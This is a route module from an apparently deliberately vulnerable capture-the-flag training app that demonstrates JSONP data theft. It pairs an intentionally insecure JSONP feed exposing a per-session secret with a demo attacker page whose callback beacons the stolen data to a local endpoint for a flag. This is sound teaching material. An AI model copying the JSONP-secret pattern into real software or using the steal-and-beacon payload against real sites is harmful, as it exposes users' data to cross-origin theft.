'use strict';
// JSONP data theft: GET /jsonp/data serves a per-session secret as JSONP,
// readable cross-origin by any page through a classic script tag (the
// Same-Origin Policy does not apply to classic scripts). The demo page
// GET /jsonp/attacker plays the role of evil.example: it pulls the feed and
// beacons the secret to POST /jsonp/beacon. The beacon only accepts the
// secret this session's feed served, so the feed must actually be loaded.
// NOTE: jsonpSecret lives in modules/jsonp/shared.js (placed by the finisher).
const express = require('express');
const { jsonpSecret } = require('../shared');
const { award, captured } = require('../../../lib/flags');
const { brief, esc, page, hintLadder, toolsPill } = require('../../../lib/page');

const router = express.Router();

const vuln = {
  id: 'csrf-data',
  name: 'JSONP Data Theft',
  difficulty: 'Medium',
  hint: 'Classic script tags ignore the Same-Origin Policy. Open the attacker page and watch it steal the feed.',
  hints: ["JSONP is cross-origin by design. The feed has a per-session secret.", "Include the feed via <script> on your attacker page. The callback gets the secret.", "Beacon the secret to prove the cross-origin read."],
  tools: "B, DT",
  how: 'Visit /jsonp/attacker so its script tag pulls /jsonp/data and beacons the secret to /jsonp/beacon.',
  link: '/jsonp#csrf-data',
  start: 'curl -s "http://localhost:3000/jsonp/data?callback=show"\n# then open http://localhost:3000/jsonp/attacker in a browser and watch the feed get stolen',
};

// JSONP feed carrying the victim's data, including the per-session secret.
router.get('/data', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: sensitive data is served as JSONP, readable cross-origin by any
  // page via a script tag. The secret is per-session: the beacon only accepts
  // the secret this session's feed actually served.
  res.send(`${cb}({"user":"alice","email":"alice@example.com","secret":"${jsonpSecret(req)}"});`);
});

// Attacker page (evil.example): steals the JSONP feed cross-origin and beacons it.
router.get('/attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'csrf-data');
  res.send(page('Attacker page', `
    <h1>Attacker page</h1>
    ${brief('JSONP theft demo', `
      <p>This page plays the role of <code>evil.example</code>. When it loads,
      it pulls the victim's JSONP feed with a plain
      <code>&lt;script&gt;</code> tag (the Same-Origin Policy does not apply to
      classic scripts) and beacons the data to <code>/jsonp/beacon</code>.</p>
    `)}
    <div class="vuln-card">
      <h3>The theft, live</h3>
      <p>This page includes the victim feed exactly the way an attacker's page would:</p>
      <pre><code>${esc('<script src="/jsonp/data?callback=steal"></script>')}</code></pre>
      <p id="status" class="note">Waiting for the JSONP response...</p>
      <script>
        function steal(d) {
          document.getElementById('status').textContent =
            'Got data for ' + d.user + '; beaconing it to /jsonp/beacon ...';
          fetch('/jsonp/beacon', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(d)
          }).then(function (r) { return r.json(); }).then(function (j) {
            document.getElementById('status').innerHTML = j.ok
              ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
              : 'Beacon rejected: ' + (j.error || 'unknown');
          });
        }
      </script>
      <script src="/jsonp/data?callback=steal"></script>
      ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    </div>
    <p class="note">The theft happens automatically when this page loads: the
    victim only has to visit the attacker's link while logged in.</p>
    ${hintLadder(vuln)}
    ${toolsPill(vuln)}
    <p><i>Attack:</i> ${esc(vuln.how)}</p>
    <p><a class="clay-btn clay-btn-secondary" href="/jsonp">Module index</a></p>
  `));
});

// Beacon: accepts the stolen secret and awards the flag. Single-use.
router.post('/beacon', (req, res) => {
  const b = req.body || {};
  // The beacon must carry the secret this session's feed served: proof the
  // feed was actually loaded. Single-use: the secret rotates after the award.
  if (b.secret && req.session.jsonpSecret && b.secret === req.session.jsonpSecret) {
    const flag = award(req, 'jsonp', 'csrf-data');
    delete req.session.jsonpSecret;
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the stolen secret field' });
});

module.exports = { vuln, router };
